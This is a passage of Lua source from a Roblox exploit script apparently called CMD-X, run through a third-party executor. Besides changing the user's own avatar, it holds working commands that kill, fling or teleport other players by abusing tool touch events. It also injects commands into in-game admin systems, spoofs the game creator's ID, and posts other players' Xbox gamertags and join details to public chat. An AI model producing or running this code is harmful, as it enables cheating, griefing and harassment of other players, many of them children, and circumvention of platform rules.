	function useCommand.jumppower()
		if arguments[2] and cmdnum(arguments[2]) then
			cmdlp.Character.Humanoid.JumpPower = arguments[2]
			opx("-","Jumppower set to "..arguments[2])
		else
			cmdlp.Character.Humanoid.JumpPower = permjumppower
			opx("-","Jumppower set to "..permjumppower)
		end
	end

	function useCommand.defaultjumppower()
		cmdlp.Character.Humanoid.JumpPower = 50
		opx("-","Jumppower set to default (50)")
	end

	function useCommand.hipheight()
		if arguments[2] and cmdnum(arguments[2]) then
			cmdlp.Character.Humanoid.HipHeight = arguments[2]
			opx("-","Hipheight set to "..arguments[2])
		else
			cmdlp.Character.Humanoid.HipHeight = permhipheight
			opx("*","Hipheight set to "..permhipheight)
		end
	end

	function useCommand.defaulthipheight()
		cmdlp.Character.Humanoid.HipHeight = saveHip
		opx("-","Hipheight set to default ("..saveHip..")")
	end

	function useCommand.gravity()
		if arguments[2] and cmdnum(arguments[2]) then
			workspace.Gravity = arguments[2]
			opx("-","Gravity set to "..arguments[2])
		else
			workspace.Gravity = permgravity
			opx("-","Gravity set to "..permgravity)
		end
	end

	function useCommand.defaultgravity()
		workspace.Gravity = 194
		opx("-","Hipheight set to default ("..saveGrav..")")
	end

	local bodyPos = false
	if cmdlp.Character then
		for _,v in pairs(cmdlp.Character:GetDescendants()) do
			if v.Name == "rocket" then
				v:Destroy()
			end
		end
	end
	function useCommand.bodypositionwalkspeed()
		if arguments[2] and cmdnum(arguments[2]) then
			local speed = 1 + arguments[2]*0.05
		else
			local speed = 1 + 10*0.05
		end
		local rocket = Instance.new("BodyPosition",cmdlp.Character.HumanoidRootPart)
		rocket.Name = "rocket"
		local upvalue = 0
		rocket.maxForce = Vector3.new(12500,12500,12500)
		bodyPos = true
		opx("-","BodyPositionWalkSpeed activated")
		while bodyPos do
			wait()
			if cmdlp.Character.Humanoid.FloorMaterial == Enum.Material.Air then
				rocket.Parent = cmdlp.Character
				wait(0.5)
			else
				wait(0.5)
				rocket.Parent = cmdlp.Character.HumanoidRootPart
			end
		end
		while bodyPos do
			wait()
			rocket.Position = Vector3.new(cmdlp.Character.Torso.Position.X+cmdlp.Character.Humanoid.MoveDirection.X*speed*5.4,cmdlp.Character.Torso.Position.Y,cmdlp.Character.Torso.Position.Z+cmdlp.Character.Humanoid.MoveDirection.Z*speed*5.4)
		end
	end

	function useCommand.avatar()
		if arguments[2] then
			opx("-","Inspecting avatar")
			game:GetService("GuiService"):InspectPlayerFromUserId(cmdp:GetUserIdFromNameAsync(arguments[2]))
		else
			opx("*","2 arguments are required!")
		end
	end

	function useCommand.halve()
		if cmd15(cmdlp) then
			opx("-","Halved character")
			cmdlp.Character.UpperTorso.Waist:Destroy()
			cmdlp.Character.UpperTorso.Anchored = true
		else
			opx("*","You need to be R15 for this command!")
		end
	end

	function useCommand.removehands()
		if cmd15(cmdlp) then
			opx("-","Removed hands")
			cmdlp.Character.RightHand:Destroy()
			cmdlp.Character.LeftHand:Destroy()
		else
			opx("*","You need to be R15 for this command!")
		end
	end

	function useCommand.removefeet()
		if cmd15(cmdlp) then
			opx("-","Removed feet")
			cmdlp.Character.RightFoot:Destroy()
			cmdlp.Character.LeftFoot:Destroy()
		else
			opx("*","You need to be R15 for this command!")
		end
	end

	function useCommand.removeleftleg()
		opx("-","Removed left leg")
		if cmd15(cmdlp) then
			cmdlp.Character.LeftUpperLeg:Destroy()
		else
			cmdlp.Character["Left Leg"]:Destroy()
		end
	end

	function useCommand.removerightleg()
		opx("-","Removed right leg")
		if cmd15(cmdlp) then
			cmdlp.Character.RightUpperLeg:Destroy()
		else
			cmdlp.Character["Right Leg"]:Destroy()
		end
	end

	function useCommand.removeleftarm()
		opx("-","Removed left arm")
		if cmd15(cmdlp) then
			cmdlp.Character.LeftUpperArm:Destroy()
		else
			cmdlp.Character["Left Arm"]:Destroy()
		end
	end

	function useCommand.removerightarm()
		opx("-","Removed right arm")
		if cmd15(cmdlp) then
			cmdlp.Character.RightUpperArm:Destroy()
		else
			cmdlp.Character["Right Arm"]:Destroy()
		end
	end

	function useCommand.removearms()
		opx("-","Removed arms")
		if cmd15(cmdlp) then
			for _,v in pairs(cmdlp.Character:GetChildren()) do
				if v.Name == "RightUpperArm" or v.Name == "LeftUpperArm" then
					v:Destroy()
				end
			end
		else
			for _,v in pairs(cmdlp.Character:GetChildren()) do
				if v.Name == "Right Arm" or v.Name == "Left Arm" then
					v:Destroy()
				end
			end
		end
	end

	function useCommand.removelegs()
		opx("-","Removed legs")
		if cmd15(cmdlp) then
			for _,v in pairs(cmdlp.Character:GetChildren()) do
				if v.Name == "RightUpperLeg" or v.Name == "LeftUpperLeg" then
					v:Destroy()
				end
			end
		else
			for _,v in pairs(cmdlp.Character:GetChildren()) do
				if v.Name == "Right Leg" or v.Name == "Left Leg" then
					v:Destroy()
				end
			end
		end
	end

	function useCommand.removelimbs()
		opx("-","Removed limbs")
		if cmd15(cmdlp) then
			for _,v in pairs(cmdlp.Character:GetChildren()) do
				if v.Name == "RightUpperArm" or v.Name == "LeftUpperArm" or v.Name == "RightUpperLeg" or v.Name == "LeftUpperLeg" then
					v:Destroy()
				end
			end
		else
			for _,v in pairs(cmdlp.Character:GetChildren()) do
				if v.Name == "Right Arm" or v.Name == "Left Arm" or v.Name == "Right Leg" or v.Name == "Left Leg" then
					v:Destroy()
				end
			end
		end
	end

	function useCommand.removelefthand()
		if cmd15(cmdlp) then
			opx("-","Removed left hand")
			cmdlp.Character.LeftHand:Destroy()
		else
			opx("*","You need to be R15 for this command!")
		end
	end

	function useCommand.removerighthand()
		if cmd15(cmdlp) then
			opx("-","Removed right hand")
			cmdlp.Character.RightHand:Destroy()
		else
			opx("*","You need to be R15 for this command!")
		end
	end

	function useCommand.removeleftfoot()
		if cmd15(cmdlp) then
			opx("-","Removed left foot")
			cmdlp.Character.LeftFoot:Destroy()
		else
			opx("*","You need to be R15 for this command!")
		end
	end

	function useCommand.removerightfoot()
		if cmd15(cmdlp) then
			opx("-","Removed right foot")
			cmdlp.Character.RightFoot:Destroy()
		else
			opx("*","You need to be R15 for this command!")
		end
	end

	function useCommand.removerightlowerarm()
		if cmd15(cmdlp) then
			opx("-","Removed right lower arm")
			cmdlp.Character.RightLowerArm:Destroy()
		else
			opx("*","You need to be R15 for this command!")
		end
	end

	function useCommand.removeleftlowerarm()
		if cmd15(cmdlp) then
			opx("-","Removed left lower arm")
			cmdlp.Character.LeftLowerArm:Destroy()
		else
			opx("*","You need to be R15 for this command!")
		end
	end

	function useCommand.removerightlowerleg()
		if cmd15(cmdlp) then
			opx("-","Removed right lower leg")
			cmdlp.Character.RightLowerLeg:Destroy()
		else
			opx("*","You need to be R15 for this command!")
		end
	end

	function useCommand.removeleftlowerleg()
		if cmd15(cmdlp) then
			opx("-","Removed left lower leg")
			cmdlp.Character.LeftLowerLeg:Destroy()
		else
			opx("*","You need to be R15 for this command!")
		end
	end

	xNamingTbl = {}
	function useCommand.nonick()
		opx("-","Blocked nicknames")
		function clean(cplr)
			if cplr.DisplayName ~= cplr.Name then
				if cplr.Character then cplr.Character:WaitForChild("Humanoid").DisplayName = cplr.Name end
				cplr.CharacterAdded:Connect(function(char)
					char:WaitForChild("Humanoid").DisplayName = "(NICKNAMED)\n"..cplr.Name
				end)
			end
		end
		xNaming = cmdp.PlayerAdded:Connect(clean)
		for _,p in pairs(cmdp:GetPlayers()) do
			clean(p)
		end
	end

	function useCommand.yesnick()
		opx("-","Unblocked nicknames")
		xNaming:Disconnect()
	end

	function useCommand.followedintopublic()
		if not arguments[2] then
			opx("*","2 arguments are required!")
			return
		end
		target = findplr(arguments[2])
		if not target then
			opx("*","Player does not exist!")
			return
		end
		if target.FollowUserId ~= 0 then
			opx("-",target.Name.." followed "..cmdp:GetNameFromUserIdAsync(target.FollowUserId).." into game")
			sayremote:FireServer(target.Name.." followed "..cmdp:GetNameFromUserIdAsync(target.FollowUserId).." into game")
		else
			opx("-",target.Name.." joined the game directly")
			sayremote:FireServer(target.Name.." joined the game directly")
		end
	end

	function useCommand.followedintoprivate()
		if not arguments[2] then
			opx("*","2 arguments are required!")
			return
		end
		target = findplr(arguments[2])
		if not target then
			opx("*","Player does not exist!")
			return
		end
		if target.FollowUserId ~= 0 then
			opx("-",target.Name.." followed "..cmdp:GetNameFromUserIdAsync(target.FollowUserId).." into game")
		else
			opx("-",target.Name.." joined the game directly")
		end
	end

	function useCommand.massfollowedinto()
		local xFollowed = ""
		for i,v in pairs(cmdp:GetPlayers()) do
			if v.FollowUserId ~= 0 then
				xFollowed = xFollowed..v.Name.." followed "..cmdp:GetNameFromUserIdAsync(v.FollowUserId).." into game\n"
			end
		end
		opx("-","Showing all followed into")
		opxL("FollowedInto",xFollowed)
	end

	function useCommand.notifyfollowed()
		followedIntoNotify = true
		opx("-","You will now be notified when someone follows you into game")
	end

	function useCommand.unnotifyfollowed()
		followedIntoNotify = false
		opx("-","You will no longer be notified")
	end

	function useCommand.xboxtagpublic()
		if not arguments[2] then
			opx("*","2 arguments are required!")
			return
		end
		target = findplr(arguments[2])
		if not target then
			opx("*","Player does not exist!")
			return
		end
		if target.PlatformName == "" then
			opx("*",target.Name.." is not using Xbox!")
			sayremote:FireServer(target.Name.." is not using Xbox", "All")
		else
			opx("*",target.Name.."(s) Xbox gametag is "..target.PlatformName)
			sayremote:FireServer(target.Name.."(s) Xbox gamertag is "..target.PlatformName, "All")
		end
	end

	function useCommand.xboxtagprivate()
		if not arguments[2] then
			opx("*","2 arguments are required!")
			return
		end
		target = findplr(arguments[2])
		if not target then
			opx("*","Player does not exist!")
			return
		end
		if target.PlatformName == "" then
			opx("*",target.Name.." is not using Xbox!")
		else
			opx("*",target.Name.."(s) Xbox gametag is "..target.PlatformName)
		end
	end

	function useCommand.massxboxtag()
		local xXBTAG = ""
		for i,v in pairs(cmdp:GetPlayers()) do
			if v.PlatformName == "" then
				xXBTAG = xXBTAG..v.Name.." is not using Xbox\n"
			else
				xXBTAG = xXBTAG..v.Name.."(s) Xbox gamertag is "..v.PlatformName.."\n"
			end
		end
		opx("-","Showing all gamertags")
		opxL("Xbox gamertags",xXBTAG)
	end

	function useCommand.appearanceidpublic()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				opx("-",target.Name.."s User AppearanceID is "..target.CharacterAppearanceId)
				sayremote:FireServer(target.Name.."s User AppearanceID is "..target.CharacterAppearanceId, "All")
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.appearanceidprivate()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				opx("-",target.Name.."s User AppearanceID is "..target.CharacterAppearanceId)
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.nilgoto()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				RootNil = cmdlp.Character.HumanoidRootPart
				RootNil.Parent = nil
				cmdlp.Character.Humanoid.Jump = true
				RootNil.CFrame = target.Character.HumanoidRootPart.CFrame
				RootNil.Parent = cmdlp.Character
				opx("-","Teleported to player "..target.Name)
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.nilfreegoto()
		if arguments[4] then
			opx("-","Teleported to "..arguments[2].." "..arguments[3].." "..arguments[4])
			RootNil = cmdlp.Character.HumanoidRootPart
			RootNil.Parent = nil
			RootNil.CFrame = CFrame.new(arguments[2], arguments[3], arguments[4])
			RootNil.Parent = cmdlp.Character
		else
			opx("*","4 arguments are required!")
		end
	end

	firstTimeHD = false
	function useCommand.hd()
		if HDAdminCheck() then
			if not firstTimeHD then
				for i,v in pairs(cmdlp.PlayerGui.HDAdminGUIs.MainFrame.Pages.Commands.Commands:GetChildren()) do
					if v:FindFirstChild("Arrow") then
						if not HDBanString[v.TextLabel.Text:sub(2,#v.TextLabel.Text)] then
							table.insert(CMDS.hd, v.TextLabel.Text:sub(2,#v.TextLabel.Text))
							table.insert(CMDS.hd, "un"..v.TextLabel.Text:sub(2,#v.TextLabel.Text))
						end
					end
				end
				firstTimeHD = true
			end
			if arguments[2] then
				local cmd = arguments[2]
				argsHD = ""
				if arguments[3] then
					argsHD = getstring(3)
				end
				local prefixHD = cmdlp.PlayerGui.HDAdminGUIs.MainFrame.Pages.Settings.Custom["AE1 Prefix"].SettingValue.TextBox.Text
				cmdrs.HDAdminClient.Signals.RequestCommand:InvokeServer(prefixHD..cmd.." "..argsHD)
			else
				opx("*","Command not found!")
			end
		else
			opx("*","HD admin wasnt found!")
		end
	end

	function useCommand.kohls()
		if workspace:FindFirstChild("Kohl's Admin Infinite") then
			if arguments[2] then
				local cmd = arguments[2]
				argsHD = ""
				if arguments[3] then
					argsHD = getstring(3)
				end
				require(cmdlp.PlayerScripts.ChatScript.ChatMain).MessagePosted:fire(":"..cmd.." "..argsHD)
			else
				opx("*","Command not found!")
			end
		else
			opx("*","Kohls admin was not found!")
		end
	end

	function useCommand.creatoridpublic()
		opx("-","The creator of the games id is "..game.CreatorId)
		sayremote("The creator of the games id is "..game.CreatorId,"All")
	end

	function useCommand.creatoridprivate()
		opx("-","The creator of the games id is "..game.CreatorId)
	end

	function useCommand.creatorid()
		opx("-","Set your ID to the creator")
		cmdlp.UserId = game.CreatorId
		cmdlp.CharacterAppearanceId = game.CreatorId
	end

	function useCommand.nilgotopart()
		if arguments[2] then
			for i,v in pairs(workspace:GetDescendants()) do
				if v.Name == getstring(2) then
					opx("-","Teleported to part")
					RootNil = cmdlp.Character.HumanoidRootPart
					RootNil.Parent = nil
					cmdlp.Character.Humanoid.Jump = true
					RootNil.CFrame = v.CFrame
					RootNil.Parent = cmdlp.Character
					break
				end
			end
		else
			opx("*","2 arguments are required!")
		end
	end

	function useCommand.nilgotoclass()
		if arguments[2] then
			opx("-","Teleported to class part")
			local Part
			for i,v in pairs(workspace:GetDescendants()) do
				if v:IsA(arguments[2]) then Part = v; break end
			end
			RootNil = cmdlp.Character.HumanoidRootPart
			RootNil.Parent = nil
			RootNil.CFrame = Part.CFrame
			RootNil.Parent = cmdlp.Character
		else
			opx("*","2 arguments are required!")
		end
	end

	function useCommand.removeinworkspace()
		if arguments[2] then
			for i,v in pairs(workspace:GetDescendants()) do
				if v.Name == getstring(2) then
					v:Destroy()
				end
			end
			opx("-","Removed in workspace "..getstring(2))
		else
			opx("*","2 arguments are required!")    
		end
	end

	function useCommand.listnil()
		local NilParts = ""
		for i,v in pairs(getnilinstances()) do
			if not v:IsDescendantOf(Unnamed) then
				NilParts = NilParts..v.Name..", "
			end
		end
		opx("-","Listed all nil parts")
		opxL("Nil Parts",NilParts)
	end

	function useCommand.removeinnil()
		if arguments[2] then
			for i,v in pairs(getnilinstances()) do
				if v.Name == getstring(2) then
					v:Destroy()
				end
			end
			opx("-","Removed in nil "..getstring(2))
		else
			opx("*","2 arguments are required!")    
		end
	end

	function useCommand.removeanim()
		opx("-","Removed animation")
		cmdlp.Character.Animate.Disabled = true
	end

	function useCommand.restoreanim()
		opx("-","Restored animation")
		cmdlp.Character.Animate.Disabled = false
	end

--[[function useCommand.removeshirt()
	opx("-","You have removed your shirt")
	cmdlp.Character.Shirt:Destroy()
end

function useCommand.removetshirt()
	opx("-","You have removed your t-shirt")
	cmdlp.Character["Shirt Graphic"]:Destroy()
end

function useCommand.removepants()
	opx("-","You have removed your pants")
	cmdlp.Character.Pants:Destroy()
end

function useCommand.removeclothes()
	opx("-","You are now naked on a kids game")
	for _,v in pairs(cmdlp.Character:GetChildren()) do
		if v.Name == "Shirt" or v.Name == "Shirt Graphic" or v.Name == "Pants" then
			v:Destroy()
		end
	end
end]]

	function useCommand.resizehead()
		if not cmd15(cmdlp) then
			opx("*","R15 is required!")
			return
		end
		opx("*","Please make sure you are wearing an RThro head!")
		opx("-","Now resizing head")
		local HumValues = {}
		for _,v in pairs(cmdlp.Character.Humanoid:GetChildren()) do
			if v:IsA("NumberValue") then
				table.insert(HumValues, v)
			end
		end
		for i = 1,10 do
			cmdlp.Character.Head.Mesh:WaitForChild("OriginalSize")
			for i,v in pairs(cmdlp.Character:GetDescendants()) do
				if v:IsA("Vector3Value") and v.Name == "OriginalSize" then
					v:Destroy()    
				end
			end
			HumValues[i]:Destroy()
			wait(.5)
		end
		cmdlp.Character.Head.CanCollide = false
	end

	function useCommand.removehatsmesh()
		opx("-","Removed hats meshes")
		for _,v in pairs(cmdlp.Character:GetChildren()) do
			if v:IsA("Accessory") then
				for _,x in pairs(v:GetDescendants()) do
					if x.Name == "Mesh" or x.Name == "SpecialMesh" then
						x:Destroy()
					end
				end
			end
		end
	end

	function useCommand.removegearmesh()
		opx("-","Removed gears meshes")
		for _,v in pairs(cmdlp.Character:GetChildren()) do
			if v:IsA("Tool") then
				for _,x in pairs(v:GetDescendants()) do
					if x.Name == "Mesh" or x.Name == "SpecialMesh" then
						x:Destroy()
					end
				end
			end
		end
	end

	function useCommand.hatgear()
		opx("-","Hats are now in your toolbar")
		for _, hat in pairs(cmdlp.Character.Humanoid:GetAccessories()) do
			if hat.Handle ~= nil then
				local tool = Instance.new("Tool", cmdlp.Backpack)
				tool.Name = hat.Name
				local hathandle = hat.Handle
				hathandle:FindFirstChildOfClass("Weld"):Destroy()
				hathandle.Parent = tool
				hathandle.Massless = true
			end
		end
	end

	function useCommand.bring()
		if not firetouchinterest then
			opx("*","Your exploit requires firetouchinterest!")
			return
		end
		local target = findplr(arguments[2] or cmdlp.Name)
		if not target then
			opx("*","Player does not exist!")
			return
		end
		cmdlp.Character.Humanoid.Name = 1
		local l = cmdlp.Character["1"]:Clone()
		l.Parent = cmdlp.Character
		l.Name = "Humanoid"
		wait(.2)
		cmdlp.Character["1"]:Destroy()
		workspace.CurrentCamera.CameraSubject = cmdlp.Character
		cmdlp.Character.Humanoid.DisplayDistanceType = "None"
		cmdlp.Character.Humanoid:UnequipTools()
		local v = cmdlp.Backpack:FindFirstChildOfClass("Tool")
		if not v then
			opx("*","Tool not found!")
			return
		end
		v.Parent = cmdlp.Character
		v.Parent = cmdlp.Character.HumanoidRootPart
		firetouchinterest(target.Character.HumanoidRootPart, v.Handle, 0)
		firetouchinterest(target.Character.HumanoidRootPart, v.Handle, 1)
		pcall(function() cmdlp.Character.HumanoidRootPart.CFrame = NormPos end)
		wait(.3)
		cmdlp.Character:Remove()
		cmdlp.CharacterAdded:Wait()
	end

--[[function useCommand.drophats()
	opx("-","Dropped your hats")
	for i,v in pairs(cmdlp.Character:GetChildren()) do
		if v:IsA("Hat") or v:IsA("Accessory") then
			v.Parent = workspace
		end
	end
end]]

	function useCommand.dropgears()
		opx("-","Dropped your gears")
		for i,v in pairs(cmdlp.Character:GetChildren()) do
			if v:IsA("Tool") then
				v.Parent = workspace
			end
		end
	end

--[[local hatSpam = false
function useCommand.hatspam()
	opx("-","Now spamming hats")
	hatSpam = true
	while hatSpam do
		refresh()
		wait(1)
		for _,v in pairs(cmdlp.Character:GetChildren()) do
			if v:IsA("Accessory") then
				for _,x in pairs(v:GetDescendants()) do
					if x.Name == "Mesh" or x.Name == "SpecialMesh" then
						x:Destroy()
					end
				end
			end
		end
		wait(1)
		for i,v in pairs(cmdlp.Character:GetChildren()) do
			if v:IsA("Accessory") then
				v.Parent = workspace
			end
		end
		wait(1)
	end
end

function useCommand.unhatspam()
	opx("-","Stopped spamming hats")
	hatSpam = false
end]]

	function useCommand.removeface()
		opx("-","Removed face")
		cmdlp.Character.Head.face:Destroy()
	end

	function useCommand.removehats()
		opx("-","Removed hats")
		for i,v in pairs(cmdlp.Character:GetChildren()) do
			if v:IsA("Hat") or v:IsA("Accessory") then
				v.Handle:Destroy()
			end
		end
	end

	function useCommand.rheadmesh()
		opx("-","Removed head mesh")
		cmdlp.Character.Head.Mesh:Destroy()
	end

	function useCommand.equip()
		opx("-","Equipped all gears")
		for _,v in pairs(cmdlp.Backpack:GetChildren()) do
			v.Parent = cmdlp.Character
		end
	end

	function useCommand.give()
		if not firetouchinterest then
			opx("*","Your exploit requires firetouchinterest!")
			return
		end
		local target = findplr(arguments[2] or cmdlp.Name)
		if not target then
			opx("*","Player does not exist!")
			return
		end
		cmdlp.Character.Humanoid.Name = 1
		local l = cmdlp.Character["1"]:Clone()
		l.Parent = cmdlp.Character
		l.Name = "Humanoid"
		wait(.2)
		cmdlp.Character["1"]:Destroy()
		workspace.CurrentCamera.CameraSubject = cmdlp.Character
		cmdlp.Character.Humanoid.DisplayDistanceType = "None"
		cmdlp.Character.Humanoid:UnequipTools()
		local v = cmdlp.Backpack:FindFirstChildOfClass("Tool")
		if not v then
			opx("*","Tool not found!")
			return
		end
		v.Parent = cmdlp.Character
		v.Parent = cmdlp.Character.HumanoidRootPart
		firetouchinterest(target.Character.HumanoidRootPart, v.Handle, 0)
		firetouchinterest(target.Character.HumanoidRootPart, v.Handle, 1)
		wait(.3)
		cmdlp.Character:Remove()
		cmdlp.CharacterAdded:Wait()
	end

	function useCommand.using()
		opx("-","Said script <3")
		sayremote:FireServer("I am using CMD-X, Version: "..ver, "All")
	end

	function useCommand.banlands()
		if not firetouchinterest then
			opx("*","Your exploit requires firetouchinterest!")
			return
		end
		local target = findplr(arguments[2] or cmdlp.Name)
		if not target then
			opx("*","Player does not exist!")
			return
		end
		cmdlp.Character.Humanoid.Name = 1
		local l = cmdlp.Character["1"]:Clone()
		l.Parent = cmdlp.Character
		l.Name = "Humanoid"
		wait(.2)
		cmdlp.Character["1"]:Destroy()
		workspace.CurrentCamera.CameraSubject = cmdlp.Character
		cmdlp.Character.Humanoid.DisplayDistanceType = "None"
		cmdlp.Character.Humanoid:UnequipTools()
		local v = cmdlp.Backpack:FindFirstChildOfClass("Tool")
		if not v then
			opx("*","Tool not found!")
			return
		end
		v.Parent = cmdlp.Character
		v.Parent = cmdlp.Character.HumanoidRootPart
		firetouchinterest(target.Character.HumanoidRootPart, v.Handle, 0)
		firetouchinterest(target.Character.HumanoidRootPart, v.Handle, 1)
		pcall(function() cmdlp.Character.HumanoidRootPart.CFrame = CFrame.new(0, 1000000, 0) end)
		wait(.3)
		cmdlp.Character:Remove()
		cmdlp.CharacterAdded:Wait()
	end

	function useCommand.kill()
		if not firetouchinterest then
			opx("*","Your exploit requires firetouchinterest!")
			return
		end
		local target = findplr(arguments[2] or cmdlp.Name)
		if not target then
			opx("*","Player does not exist!")
			return
		end
		cmdlp.Character.Humanoid.Name = 1
		local l = cmdlp.Character["1"]:Clone()
		l.Parent = cmdlp.Character
		l.Name = "Humanoid"
		wait(.2)
		cmdlp.Character["1"]:Destroy()
		workspace.CurrentCamera.CameraSubject = cmdlp.Character
		cmdlp.Character.Humanoid.DisplayDistanceType = "None"
		cmdlp.Character.Humanoid:UnequipTools()
		local v = cmdlp.Backpack:FindFirstChildOfClass("Tool")
		if not v then
			opx("*","Tool not found!")
			return
		end
		v.Parent = cmdlp.Character
		v.Parent = cmdlp.Character.HumanoidRootPart
		firetouchinterest(target.Character.HumanoidRootPart, v.Handle, 0)
		firetouchinterest(target.Character.HumanoidRootPart, v.Handle, 1)
		pcall(function() cmdlp.Character.HumanoidRootPart.CFrame = CFrame.new(0, workspace.FallenPartsDestroyHeight + 5, 0) end)
		wait(.3)
		cmdlp.Character:Remove()
		cmdlp.CharacterAdded:Wait()
	end

	local Flipping = false
	function useCommand.flip()
		opx("-","Now flipping")
		Flipping = true
		pl=cmdlp
		me=pl.Character
		xl=me.Torso['Right Shoulder']
		local debounce=false
		function _restoreproperties()
			Holder = player.Character
			Torso = Holder:FindFirstChild("Torso")
			RightS = Torso:FindFirstChild("Right Shoulder")
			LeftS = Torso:FindFirstChild("Left Shoulder")
			RightH = Torso:FindFirstChild("Right Hip")
			LeftH = Torso:FindFirstChild("Left Hip")
			RightS.MaxVelocity = .15
			LeftS.MaxVelocity = .15
			RightH.MaxVelocity = .1
			LeftH.MaxVelocity = .1
			RightS.DesiredAngle = 0
			LeftS.DesiredAngle = 0
			LeftH.DesiredAngle = 0
			RightH.DesiredAngle = 0
		end
		function ManageAnimation(value)
			Holder = player.Character
			Player = player
			if value == "no anim" then
				Anim = Holder:FindFirstChild("Animate")
				if Anim~=nil then
					Anim.Disabled = true
					Anim.Parent = Player
				end
			elseif value == "re-anim" then
				Anim = Player:FindFirstChild("Animate")
				if Anim~=nil then
					Anim.Disabled = false
					Anim.Parent = Holder
				end
			end
		end
		function Down(ml)
			for i=1, ml.velocity.y/3 do
				ml.velocity = ml.velocity+Vector3.new(0,-4.25,0)
				wait()
			end
			ml:Remove()
		end
		function Flip2()
			if debounce==true then return end
			debounce=true
			Char = player.Character
			Human = Char.Humanoid
			Torso = Char.Torso
			CF = Torso.CFrame
			Human.PlatformStand = true
			VelUp = Instance.new("BodyVelocity")
			VelUp.velocity = Vector3.new(0,60,0)+Torso.CFrame.lookVector*26
			VelUp.P = VelUp.P*2
			VelUp.maxForce = Vector3.new(10000,10000,10000)*999
			VelUp.Parent = Torso
			coroutine.resume(coroutine.create(Down),VelUp)
			Gyro = Instance.new("BodyGyro")
			Gyro.P = Gyro.P*10
			Gyro.maxTorque = Vector3.new(100000,100000,100000)*999
			Gyro.cframe = CF
			Gyro.Parent = Torso
			for i=2, 28 do
				Gyro.cframe = Gyro.cframe*CFrame.fromEulerAnglesXYZ(math.pi/-16,0,0)
				wait()
			end
			Gyro.cframe = CF
			wait()
			Gyro:Remove()
			Human.PlatformStand = false
			_restoreproperties()
			debounce=false
		end
		while Flipping do
			wait()
			Flip2()
		end
	end

	function useCommand.unflip()
		Flipping = false
		opx("-","No longer flipping")
	end

	local doubleFlipping = false
	function useCommand.doubleflip()
		opx("-","Now double flipping")
		doubleFlipping = true
		pl=cmdlp
		me=pl.Character
		xl=me.Torso['Right Shoulder']
		local debounce=false
		function _restoreproperties()
			Holder = player.Character
			Torso = Holder:FindFirstChild("Torso")
			RightS = Torso:FindFirstChild("Right Shoulder")
			LeftS = Torso:FindFirstChild("Left Shoulder")
			RightH = Torso:FindFirstChild("Right Hip")
			LeftH = Torso:FindFirstChild("Left Hip")
			RightS.MaxVelocity = .15
			LeftS.MaxVelocity = .15
			RightH.MaxVelocity = .1
			LeftH.MaxVelocity = .1
			RightS.DesiredAngle = 0
			LeftS.DesiredAngle = 0
			LeftH.DesiredAngle = 0
			RightH.DesiredAngle = 0
		end
		function ManageAnimation(value)
			Holder = player.Character
			Player = player
			if value == "no anim" then
				Anim = Holder:FindFirstChild("Animate")
				if Anim~=nil then
					Anim.Disabled = true
					Anim.Parent = Player
				end
			elseif value == "re-anim" then
				Anim = Player:FindFirstChild("Animate")
				if Anim~=nil then
					Anim.Disabled = false
					Anim.Parent = Holder
				end
			end
		end
		function Down(ml)
			for i=1, ml.velocity.y/3 do
				ml.velocity = ml.velocity+Vector3.new(0,-4.25,0)
				wait()
			end
			ml:Remove()
		end
		function Flip3()
			if debounce==true then return end
			debounce=true
			Char = player.Character
			Human = Char.Humanoid
			Torso = Char.Torso
			CF = Torso.CFrame
			Human.PlatformStand = true
			VelUp = Instance.new("BodyVelocity")
			VelUp.velocity = Vector3.new(0,60,0)+Torso.CFrame.lookVector*26
			VelUp.P = VelUp.P*2
			VelUp.maxForce = Vector3.new(10000,10000,10000)*999
			VelUp.Parent = Torso
			coroutine.resume(coroutine.create(Down),VelUp)
			Gyro = Instance.new("BodyGyro")
			Gyro.P = Gyro.P*10
			Gyro.maxTorque = Vector3.new(100000,100000,100000)*999
			Gyro.cframe = CF
			Gyro.Parent = Torso
			for i=2, 28 do
				Gyro.cframe = Gyro.cframe*CFrame.fromEulerAnglesXYZ(math.pi/-8,0,0)
				wait()
			end
			Gyro.cframe = CF
			wait()
			Gyro:Remove()
			Human.PlatformStand = false
			_restoreproperties()
			debounce=false
		end
		while doubleFlipping do
			wait()
			Flip3()
		end
	end

	function useCommand.undoubleflip()
		doubleFlipping = false
		opx("-","No longer double flipping")
	end

	local stick = false
	function useCommand.glue()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				stick = true
				opx("-","Now glued to "..target.Name)
				repeat wait()
					cmdlp.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(cmdlp.Character.HumanoidRootPart.CFrame.lookVector.X,target.Character.HumanoidRootPart.Size.Y,cmdlp.Character.HumanoidRootPart.CFrame.lookVector.Z)
				until stick == false
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.unglue()
		stick = false
		opx("-","No longer glued")
	end

	T1.Name = "T1"
	T1.Parent = HoldTab
	T1.BackgroundColor3 = Color3.new(0.113725, 0.113725, 0.113725)
	T1.BorderSizePixel = 0
	T1.Position = UDim2.new(0, 0, 0.110238664, 0)
	T1.Size = UDim2.new(0, 141, 0, 18)
	T1.Text = ""
	T1.TextColor3 = Color3.new(1, 1, 1)
	T1.TextSize = 12

	XE.Name = "XE"
	XE.Parent = T1
	XE.BackgroundColor3 = Color3.new(0.101961, 0.101961, 0.101961)
	XE.BorderSizePixel = 0
	XE.Position = UDim2.new(0.861749768, 0, -0.0032687718, 0)
	XE.Size = UDim2.new(0, 19, 0, 18)
	XE.Font = Enum.Font.SourceSansBold
	XE.Text = "+"
	XE.TextColor3 = Color3.new(1, 1, 1)
	XE.TextSize = 14
	XE.MouseButton1Down:Connect(function()
		arguments = T1.Text:split(" ")
		useCommand[arguments[1]]()
	end)

	T2.Name = "T2"
	T2.Parent = HoldTab
	T2.BackgroundColor3 = Color3.new(0.113725, 0.113725, 0.113725)
	T2.BorderSizePixel = 0
	T2.Position = UDim2.new(0, 0, 0.188670039, 0)
	T2.Size = UDim2.new(0, 141, 0, 18)
	T2.Text = ""
	T2.TextColor3 = Color3.new(1, 1, 1)
